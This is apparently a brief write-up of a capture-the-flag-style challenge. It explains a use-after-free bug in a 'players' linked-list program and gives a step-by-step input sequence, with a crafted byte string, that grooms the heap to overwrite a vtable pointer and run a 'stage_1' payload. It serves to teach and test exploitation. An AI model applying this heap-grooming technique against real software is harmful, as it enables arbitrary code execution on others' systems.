players has a use-after-free vulnerability. players consist of player objects
with pointers to a vtable of function pointers, a pointer to a heap allocated
string and pointers to the next player object. When a player is deleted, the
next pointer from the player's predecessor is not updated appropriately.

In order for this vulnerability to be exploited, a specific order of mallocs
and frees must set the conditions of the heap implementation to allow
attacker-controlled data to take place of the old object. One such order is:

Create player ONE.
Create player TWO. ONE -> TWO.
Player TWO is deleted
Player ONE is renamed. It's string will occupy the space previously allocated
	for Player TWO

new
aaa
new
bbb
next
delete
first
rename
\x20\x10\x20\x18\xff\x0a // 0xff byte is padding to align next input to 0x2018
rename
stage_1 (starts at 0x2018)
next
print

this sequence of events will cause stage_1 to execute